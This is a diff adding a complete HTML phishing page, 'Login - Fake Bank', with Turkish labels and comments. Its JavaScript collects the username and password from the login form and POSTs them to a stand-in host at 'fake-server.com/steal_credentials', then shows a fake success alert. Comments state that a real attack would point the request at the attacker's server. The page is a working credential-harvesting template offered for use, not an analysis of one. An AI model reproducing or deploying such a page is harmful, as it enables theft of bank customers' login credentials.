@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Fake Bank</title>
+    <script>
+        function captureCredentials() {
+            // Kullanıcı adı ve şifreyi al
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Sahte sunucuya gönderme (Gerçek saldırıda burası hacker'in sunucusu olur)
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "https://fake-server.com/steal_credentials", true); // Burada hacker'in sunucusu olacak
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("username=" + username + "&password=" + password);
+
+            alert("Login başarılı!");
+        }
+    </script>
+</head>
+<body>
+    <h2>Bankanızın Giriş Sayfası</h2>
+    <form onsubmit="event.preventDefault(); captureCredentials();">
+        <label for="username">Kullanıcı Adı:</label>
+        <input type="text" id="username" required><br><br>
+        <label for="password">Şifre:</label>
+        <input type="password" id="password" required><br><br>
+        <input type="submit" value="Giriş Yap">
+    </form>
+</body>
+</html>
